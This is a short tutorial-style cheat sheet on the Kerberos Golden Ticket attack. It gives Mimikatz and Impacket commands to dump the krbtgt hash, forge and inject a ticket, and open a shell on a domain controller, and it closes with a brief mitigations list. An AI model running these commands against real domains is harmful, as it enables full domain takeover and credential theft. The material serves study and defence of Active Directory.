# Golden Ticket Attack

Forge a Kerberos TGT using the krbtgt account hash, granting unlimited access to every resource in the domain.

## Prerequisites

- krbtgt NTLM hash (from DCSync or DC compromise)
- Domain SID
- Domain name

## Getting the krbtgt Hash

```
# With Mimikatz (DCSync)
lsadump::dcsync /user:krbtgt
```

Or use secretsdump from Linux:

```bash
secretsdump.py DOMAIN/admin:'password'@DC_IP
```

## Getting the Domain SID

```bash
# From Linux
lookupsid.py DOMAIN/username:'password'@DC_IP

# From Windows
whoami /user
# Remove the last RID (e.g., -1001) to get the domain SID
```

## Creating the Golden Ticket

### With Mimikatz

```
# Create the ticket
kerberos::golden /user:Administrator /domain:DOMAIN.local /sid:S-1-5-21-XXXX /krbtgt:HASH /id:500 /ptt

# /ptt = pass the ticket (inject into current session)
```

### Verify Access

```bash
# Should now have DA access
dir \\DC\C$

# Open a shell on the DC
misc::cmd
psexec.exe \\DC cmd.exe
```

## Why It's Dangerous

- Valid for 10 years by default
- Works even if the user's password changes
- Works even if the user account is disabled/deleted
- Only invalidated by resetting krbtgt password **twice**

## Mitigations

- Change krbtgt password regularly (rotate twice to fully invalidate)
- Monitor for TGTs with abnormally long lifetimes
- Limit accounts with DCSync/replication rights
- Use tiered administration model
